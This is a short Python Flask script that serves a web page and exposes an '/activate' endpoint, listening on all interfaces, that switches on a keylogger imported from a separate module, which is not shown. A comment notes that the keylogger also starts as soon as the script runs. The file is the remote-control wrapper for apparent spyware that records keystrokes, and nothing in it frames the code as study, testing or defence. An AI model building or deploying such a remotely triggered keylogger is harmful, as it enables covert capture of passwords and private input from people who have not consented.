from flask import Flask, send_from_directory, request
import threading
from Keylogger import start_logging, activate_logging

app = Flask(__name__)

@app.route('/')
def serve_html():
    return send_from_directory('.', 'main.html')  # Serves the index.html file

@app.route('/activate', methods=['POST'])
def activate_keylogger():
    activate_logging()  # Set the global flag in keylogger.py to start logging
    return "Keylogger activated!", 200

if __name__ == "__main__":
    # Run the Flask app in a separate thread
    threading.Thread(target=app.run, kwargs={"host": "0.0.0.0", "port": 5000, "debug": False}).start()
    # The keylogger already starts when the script is run
